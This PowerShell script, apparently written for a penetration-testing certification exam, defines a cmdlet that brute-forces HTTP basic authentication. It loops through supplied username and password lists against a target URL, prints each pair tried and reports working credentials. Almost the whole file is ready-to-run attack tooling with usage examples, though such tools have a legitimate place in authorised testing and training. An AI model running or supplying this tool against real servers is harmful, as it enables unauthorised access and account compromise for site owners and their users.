﻿## Powershell For Penetration Testers Exam Task 1 - Brute Force Basic Authentication Cmtlet
function Brute-Basic-Auth
{

<#

.SYNOPSIS
PowerShell cmdlet for brute forcing basic authentication on web servers.

.DESCRIPTION
this script is able to connect to a webserver and attempt to login with a list of usernames and a list of passwords.

.PARAMETER Hostname
The hostname or IP address to connect to when using the -Hostname switch.

.PARAMETER Port
The port the webserver is running on to brute. Default is 80, can change it with the -Port switch.

.PARAMETER UsernameList
The list of usernames to use in the brute force

.PARAMETER PasswordList
The list of passwords to use in the brute force

.PARAMETER StopOnSuccess
Use this switch to stop the brute on the first successful auth

.PARAMETER Protocol
The protocol to bruteforce basic auth against, default is http

.PARAMETER File
The file on the target server that the bruteforce attempts to authenticat against

.EXAMPLE
PS > Brute-Basic-Auth -Host www.example.com

.LINK
https://github.com/ahhh/PSSE/blob/master/Brute-Basic-Auth.ps1
http://lockboxx.blogspot.com/2016/01/brute-force-basic-authentication.html

.NOTES
This script has been created for completing the requirements of the SecurityTube PowerShell for Penetration Testers Certification Exam
http://www.securitytube-training.com/online-courses/powershell-for-pentesters/
Student ID: PSP-3061
Technically heavily inspired by:
https://github.com/samratashok/nishang

#>

  [CmdletBinding()] Param(
  
    [Parameter(Mandatory = $true, ValueFromPipeline=$true)]
    [Alias("host", "IPAddress")]
    [String]
    $Hostname,
    
    [Parameter(Mandatory = $true)]
    [String]
    $UsernameList,
    
    [Parameter(Mandatory = $true)]
    [String]
    $PasswordList,
    
    [Parameter(Mandatory = $false)]
    [String]
    $Port = "80",
    
    [Parameter(Mandatory = $false)]
    [String]
    $StopOnSuccess = "True",
    
    [Parameter(Mandatory = $false)]
    [String]
    $Protocol = "http",

    [Parameter(Mandatory = $false)]
    [String]
    $File = ""
  
  )
  
  $url = $Protocol + "://" + $Hostname + ":" + $Port + "/" + $File
  
  
  # Read in lists for usernames and passwords
  $Usernames = Get-Content $UsernameList
  $Passwords = Get-Content $PasswordList
  
  # Does a depth first loop over usernames first, trying every password for each username sequentially in the list
  :UNLoop foreach ($Username in $Usernames)
  {
    # Loops through passwords in the list sequentially
    foreach ($Password in $Passwords)
    {
      # Starts a new web client
      $WebClient = New-Object Net.WebClient
      # Sets basic authentication credentials for web client
      $SecurePassword = ConvertTo-SecureString -AsPlainText -String $Password -Force
      $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $Username, $SecurePassword
      $WebClient.Credentials = $Credential
      Try
      {
        # Prints the target
        $url
        # Prints the credentials being tested
        $message = "Checking $Username : $Password"
        $message
        $content = $webClient.DownloadString($url)
        # Continues on to print succesful credentials
        $success = $true
        #$success
        if ($success -eq $true)
        {
          # Prints succesful auths to highlight legit creds
          $message = "[*]Match found! $Username : $Password"
          $message
          $content
          if ($StopOnSuccess)
          {
            break UNLoop
          }
        }
      }
      Catch
      {
        # Print any error we receive
        $success = $false
        $message = $error[0].ToString()
        $message
      }
    }
  }
}

Brute-Basic-Auth